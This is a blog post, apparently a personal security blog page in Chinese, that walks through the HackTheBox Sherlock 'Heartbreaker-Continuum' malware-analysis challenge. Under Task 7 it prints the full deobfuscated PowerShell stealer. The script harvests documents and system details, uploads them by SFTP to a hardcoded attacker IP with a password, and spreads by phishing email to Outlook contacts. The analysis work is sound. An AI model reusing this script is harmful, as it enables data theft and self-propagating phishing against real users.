@@ -1,0 +1,462 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="msvalidate.01" content="AD68C94074ED3981E797ADA66A7F26A2" />
+<title>HackTheBox Heartbreaker-Continuum | 李西瓜🍉</title>
+<link rel="shortcut icon" href="https://xor37.github.io/favicon.ico?v=1723789260662">
+<link rel="stylesheet" href="https://xor37.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="HackTheBox Heartbreaker-Continuum | 李西瓜🍉 - Atom Feed" href="https://xor37.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel='stylesheet' href='https://fonts.cdnfonts.com/css/nunito' />
+<link rel='stylesheet' href='https://chinese-fonts-cdn.deno.dev/chinesefonts3/packages/lxgwwenkai/dist/LXGWWenKai-Regular/result.css' />
+<style>
+  :root {
+    --base-font-family: 'LXGW WenKai', 'Nunito', sans-serif !important;
+    --content-font-family: 'LXGW WenKai', 'Nunito', sans-serif !important;
+    --heading-font-family: 'LXGW WenKai', 'Nunito', sans-serif !important;
+    --heading-font-weight: 'LXGW WenKai', 'Nunito', sans-serif !important;
+  }
+  div {
+    --base-font-family: 'LXGW WenKai', 'Nunito', sans-serif !important;
+    --content-font-family: 'LXGW WenKai', 'Nunito', sans-serif !important;
+    --heading-font-family: 'LXGW WenKai', 'Nunito', sans-serif !important;
+    --heading-font-weight: 'LXGW WenKai', 'Nunito', sans-serif !important;
+  }
+  img {
+    box-shadow: none;
+  }
+</style>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-7Z0TG0H32V"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-7Z0TG0H32V');
+</script>
+
+
+    <meta name="description" content="前言
+揭开病毒分析的迷雾，回答官方提出的问题，了解这个病毒的工作原理。
+背景
+
+Following a recent report of a data breach at their company, the client submitte..." />
+    <meta name="keywords" content="HackTheBox,Sherlocks" />
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xor37.github.io">
+  <img class="avatar" src="https://xor37.github.io/images/avatar.png?v=1723789260662" alt="">
+  </a>
+  <h1 class="site-title">
+    李西瓜🍉
+  </h1>
+  <p class="site-description">
+    喜欢就买 不行就分 多喝热水 少刷视频
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+        <a href="https://twitter.com/Aurey596200" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              HackTheBox Heartbreaker-Continuum
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-08-13
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://xor37.github.io/tag/b5eMiO4RU/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+                <a href="https://xor37.github.io/tag/u0pIDXwuX1/" class="post-tag">
+                  # Sherlocks
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Library.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>揭开病毒分析的迷雾，回答官方提出的问题，了解这个病毒的工作原理。</p>
+<h2 id="背景">背景</h2>
+<blockquote>
+<p>Following a recent report of a data breach at their company, the client submitted a potentially malicious executable file. The file originated from a link within a phishing email received by a victim user. Your objective is to analyze the binary to determine its functionality and possible consequences it may have on their network. By analyzing the functionality and potential consequences of this binary, you can gain valuable insights into the scope of the data breach and identify if it facilitated data exfiltration. Understanding the binary's capabilities will enable you to provide the client with a comprehensive report detailing the attack methodology, potential data at risk, and recommended mitigation steps.</p>
+</blockquote>
+<h2 id="task-1">Task 1</h2>
+<blockquote>
+<p>To accurately reference and identify the suspicious binary, please provide its SHA256 hash.</p>
+</blockquote>
+<p>Virustotal 能获取很多关于这个病毒的信息。<br>
+<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813140753.png" alt="" loading="lazy"></p>
+<h2 id="task-2">Task 2</h2>
+<blockquote>
+<p>When was the binary file originally created, according to its metadata (UTC)?</p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813141115.png" alt="" loading="lazy"></figure>
+<h2 id="task-3">Task 3</h2>
+<blockquote>
+<p>Examining the code size in a binary file can give indications about its functionality. Could you specify the byte size of the code in this binary?</p>
+</blockquote>
+<figure data-type="image" tabindex="2"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813141315.png" alt="" loading="lazy"></figure>
+<h2 id="task-4">Task 4</h2>
+<blockquote>
+<p>It appears that the binary may have undergone a file conversion process. Could you determine its original filename?</p>
+</blockquote>
+<figure data-type="image" tabindex="3"><img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813142636.png" alt="" loading="lazy"></figure>
+<h2 id="task-5">Task 5</h2>
+<blockquote>
+<p>Specify the hexadecimal offset where the obfuscated code of the identified original file begins in the binary.</p>
+</blockquote>
+<p>这里通过 16 进制编辑器就能看到，现实的病毒可能需要各种逆向分析。<br>
+<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813142952.png" alt="" loading="lazy"></p>
+<h2 id="task-6">Task 6</h2>
+<blockquote>
+<p>The threat actor concealed the plaintext script within the binary. Can you provide the encoding method used for this obfuscation?</p>
+</blockquote>
+<p>把代码提取出来，可以看到字符翻转、Base64、字符拼接的行为。问的是编码，那就是 Base64 了。<br>
+<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813143620.png" alt="" loading="lazy"></p>
+<h2 id="task-7">Task 7</h2>
+<blockquote>
+<p>What is the specific cmdlet utilized that was used to initiate file downloads?</p>
+</blockquote>
+<p>还原上面的恶意代码</p>
+<pre><code class="language-bash">$hostname = $env:COMPUTERNAME
+$currentUser = $env:USERNAME
+$url = &quot;http://44.206.187.144:9000/Superstar_MemberCard.tiff&quot;
+$img = &quot;C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff&quot;
+
+Invoke-WebRequest -Uri $url -OutFile $img
+Start-Process $img
+
+$searchDir = &quot;C:\Users&quot;
+$targetDir = &quot;C:\Users\Public\Public Files&quot;
+
+if (-not (Test-Path -Path $targetDir -PathType Container)) {
+    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+}
+
+$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force
+
+nltest /dsgetdc:$env:USERDOMAIN 2&gt;$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
+Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
+wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2&gt;$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force
+
+$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
+    try {
+        $_.GetOwner().User -eq $currentUser
+    } catch {
+        $false  
+    }
+}
+
+$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force
+
+if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
+    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
+}
+
+$extList =  &quot;*.doc&quot;, &quot;*.docx&quot;, &quot;*.xls&quot;, &quot;*.xlsx&quot;, &quot;*.ppt&quot;, &quot;*.pptx&quot;, &quot;*.pdf&quot;, &quot;*.csv&quot;, &quot;.*oft&quot;, &quot;*.potx&quot;, 
+            &quot;*.xltx&quot;, &quot;*.dotx&quot;, &quot;*.msg&quot;, &quot;*.eml&quot;, &quot;*.pst&quot;,  &quot;*.odt&quot;, &quot;*.ods&quot;, &quot;*.odp&quot;, &quot;*.odg&quot;, &quot;*.ost&quot;
+             
+$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
+    ForEach-Object {
+        $destinationPath = Join-Path $targetDir $_.Name
+        
+        if ($_.FullName -ne $destinationPath) {
+            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
+        }
+    }
+
+Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
+gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
+$ProgressPreference = 'SilentlyContinue'
+$archivePath = &quot;$targetDir\$hostname.zip&quot;
+Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 
+
+$wZipUrl = &quot;https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip&quot;
+$wZipFile = &quot;$targetDir\WinSCP.zip&quot;
+$wExtractPath = &quot;C:\Users\Public\HelpDesk-Tools&quot;
+
+Invoke-WebRequest -UserAgent &quot;Wget&quot; -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
+Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force
+
+$wExePath = &quot;$wExtractPath\WinSCP.com&quot;
+$sPath = &quot;$wExtractPath\maintenanceScript.txt&quot;
+@&quot;
+open sftp://service:M8&amp;C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
+put `&quot;$archivePath`&quot;
+close
+exit
+&quot;@ | Out-File -FilePath $sPath -Force
+Start-Process -FilePath $wExePath -ArgumentList &quot;/script=`&quot;$sPath`&quot;&quot; -Wait -NoNewWindow
+
+
+$outlookPath  = Get-ChildItem -Path &quot;C:\Program Files\Microsoft Office&quot; -Filter &quot;OUTLOOK.EXE&quot; -Recurse | Select-Object -First 1 -ExpandProperty FullName
+
+$htmlBody = @&quot;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+    body {
+    font-family: Calibri, sans-serif;
+    }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;Hey, &lt;/p&gt; &lt;p&gt; Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been admiring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.&lt;/p&gt;
+&lt;p&gt;In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to it, I'd love for us to meet up after hours.&lt;/p&gt;
+&lt;p&gt;I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. &lt;/p&gt;
+&lt;p&gt;To gain entry, you'll need a digital membership card for entry, accessible &lt;a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'&gt;here&lt;/a&gt;. Just a friendly heads up, there's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.&lt;/p&gt;
+&lt;p&gt;Counting on seeing you there later.&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&quot;@
+
+if ($outlookPath) {
+    Start-Process -FilePath $outlookPath
+    $outlook = New-Object -ComObject Outlook.Application
+    $namespace = $outlook.GetNamespace(&quot;MAPI&quot;)
+    $contactsFolder = $namespace.GetDefaultFolder(10) 
+    $csvFilePath = &quot;$targetDir\Contacts.csv&quot;
+    $contactsFolder.Items | ForEach-Object {
+        $_.GetInspector | ForEach-Object {
+            $_.Close(0)  
+        }
+        $props = @{
+            'Full Name'      = $_.FullName
+            'Email Address'  = $_.Email1Address
+            
+        }
+        New-Object PSObject -Property $props
+    } | Export-Csv -Path $csvFilePath -NoTypeInformation
+
+    $contacts = Import-Csv -Path $csvFilePath
+    $mailItem = $outlook.CreateItem(0)
+    $mailItem.Subject = &quot;Fingers crossed you'll notice..&quot;
+    $mailItem.HtmlBody = $htmlBody
+    $mailItem.Attachments.Add($img) &gt; $null
+    $mailItem.BodyFormat = 2 
+
+    foreach ($contact in $contacts) {
+        $bccRecipient = $mailItem.Recipients.Add($contact.&quot;Email Address&quot;)
+        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
+    }
+
+    $mailItem.Recipients.ResolveAll() &gt; $null
+    $mailItem.Send()
+}
+
+Remove-Item -Path $wExtractPath -Recurse -Force
+Remove-Item -Path $targetDir -Recurse -Force
+
+</code></pre>
+<p>可以看到</p>
+<pre><code class="language-bash">Invoke-WebRequest -Uri $url -OutFile $img
+</code></pre>
+<h2 id="task-8">Task 8</h2>
+<blockquote>
+<p>Could you identify any possible network-related Indicators of Compromise (IoCs) after examining the code? Separate IPs by comma and in ascending order.</p>
+</blockquote>
+<p>CyberChef 直接提取 IP<br>
+<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/Pasted%20image%2020240813144437.png" alt="" loading="lazy"></p>
+<h2 id="task-9">Task 9</h2>
+<blockquote>
+<p>The binary created a staging directory. Can you specify the location of this directory where the harvested files are stored?</p>
+</blockquote>
+<p>阅读恶意代码可知</p>
+<pre><code class="language-bash">$targetDir = &quot;C:\Users\Public\Public Files&quot;
+</code></pre>
+<h2 id="task-10">Task 10</h2>
+<blockquote>
+<p>What MITRE ID corresponds to the technique used by the malicious binary to autonomously gather data?</p>
+</blockquote>
+<p>执行恶意代码的时候会自动收集用户的各种信息和文件。根据 https://attack.mitre.org/tactics/TA0009/ 可知是 T1119.</p>
+<h2 id="task-11">Task 11</h2>
+<blockquote>
+<p>What is the password utilized to exfiltrate the collected files through the file transfer program within the binary?</p>
+</blockquote>
+<pre><code class="language-bash">@&quot;
+open sftp://service:M8&amp;C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
+put `&quot;$archivePath`&quot;
+close
+exit
+&quot;@ 
+</code></pre>
+<p>完结撒花<br>
+<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/%E6%88%AA%E5%B1%8F2024-08-13%2014.55.50.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E8%83%8C%E6%99%AF">背景</a></li>
+<li><a href="#task-1">Task 1</a></li>
+<li><a href="#task-2">Task 2</a></li>
+<li><a href="#task-3">Task 3</a></li>
+<li><a href="#task-4">Task 4</a></li>
+<li><a href="#task-5">Task 5</a></li>
+<li><a href="#task-6">Task 6</a></li>
+<li><a href="#task-7">Task 7</a></li>
+<li><a href="#task-8">Task 8</a></li>
+<li><a href="#task-9">Task 9</a></li>
+<li><a href="#task-10">Task 10</a></li>
+<li><a href="#task-11">Task 11</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xor37.github.io/post/hackthebox-sherlocks-fragility/">
+              <h3 class="post-title">
+                HackTheBox Sherlocks - Fragility
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'Ov23liYaBGZzPNFfp6VA',
+    clientSecret: '3f40675cb23924abd7f17f3c2ee9b29a719a61d7',
+    repo: 'xor37.github.io',
+    owner: 'xor37',
+    admin: ['xor37'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://xor37.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
